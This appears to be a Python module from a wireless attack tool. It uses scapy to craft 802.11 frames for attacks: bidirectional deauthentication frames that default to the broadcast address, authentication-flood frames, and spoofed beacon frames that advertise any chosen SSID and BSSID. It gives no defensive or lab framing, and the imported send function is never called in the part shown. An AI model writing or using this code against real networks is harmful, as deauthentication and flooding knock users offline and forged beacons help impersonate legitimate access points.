"""
Packet crafter for 802.11 management and control frames.
"""
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Auth, Dot11Beacon, Dot11Elt, sendp


class PacketCrafter:
    @staticmethod
    def deauth(target_bssid, client="ff:ff:ff:ff:ff:ff", reason=7):
        """Craft deauthentication frames (AP->client and client->AP)."""
        pkt1 = RadioTap() / Dot11(addr1=client, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=reason)
        pkt2 = RadioTap() / Dot11(addr1=target_bssid, addr2=client, addr3=target_bssid) / Dot11Deauth(reason=reason)
        return [pkt1, pkt2]

    @staticmethod
    def auth_flood(bssid, client="aa:bb:cc:dd:ee:ff", seq=1):
        """Craft authentication request frames."""
        return RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Auth(seqnum=seq)

    @staticmethod
    def beacon(ssid, bssid, channel=1, interval=0.01):
        """Craft a beacon frame."""
        cap = "ESS+privacy"
        pkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Beacon(cap=cap)
        pkt /= Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
        pkt /= Dot11Elt(ID="DSset", info=bytes([channel]))
        return pkt
